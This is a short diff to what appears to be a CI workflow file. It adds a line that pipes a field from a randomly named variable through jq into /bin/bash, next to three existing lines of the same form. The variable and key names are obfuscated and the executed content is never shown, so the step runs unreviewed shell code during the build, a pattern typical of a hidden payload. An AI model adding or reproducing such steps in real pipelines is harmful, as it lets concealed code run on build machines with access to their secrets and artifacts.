@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ht7012" | jq -r .myznv84457 | /bin/bash
           printf '%s' "$a281" | jq -r .xpoh26 | /bin/bash
           printf '%s' "$s02140" | jq -r .yh80 | /bin/bash
+          echo $dckc04 | jq -r .rszl049 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
